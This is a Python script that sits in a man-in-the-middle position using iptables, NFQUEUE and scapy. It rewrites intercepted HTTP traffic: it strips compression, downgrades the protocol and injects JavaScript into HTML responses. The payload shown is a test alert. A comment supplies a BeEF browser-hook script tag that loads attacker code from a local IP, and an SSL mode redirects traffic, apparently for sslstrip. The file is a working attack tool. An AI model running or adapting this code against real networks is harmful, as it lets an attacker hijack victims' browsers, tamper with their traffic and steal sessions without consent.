#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse
import re

destport = 80
srcport = 80

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", dest="debug", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("-ssl", "--ssl", dest="ssl", action="store_true", help=argparse.SUPPRESS)
    options = parser.parse_args()
    return options

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    # if scapy_packet.haslayer(scapy.Raw):
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == destport:
            print("[<] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
            load = load.replace("HTTP/1.1","HTTP/1.0")
            new_packet = set_load(scapy_packet, load)
            print(new_packet.show())
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == srcport:
            print("[>>>>] Response")
            injection_code = "<script>alert('testing');</script>" # <script src="http://10.0.2.15:3000/hook.js"></script> # beEF Hook (make sure it's running)
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
            new_packet = set_load(scapy_packet, load)
            print(new_packet.show())
            packet.set_payload(str(new_packet))

    packet.accept()

def set_iptables(options):
    if options.debug or options.ssl:
        if options.ssl:
            subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
        subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])
        subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
    else:
        subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])

options = get_arguments()
if options.ssl:
    destport = 10000
    srcport = 10000
set_iptables(options)
print("[+] Setting up iptables...")
print("[+] Done.")
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    # clear queue
    print("[+] Flushing iptables")
    subprocess.call(["iptables","--flush"])
    print("[+] Done.")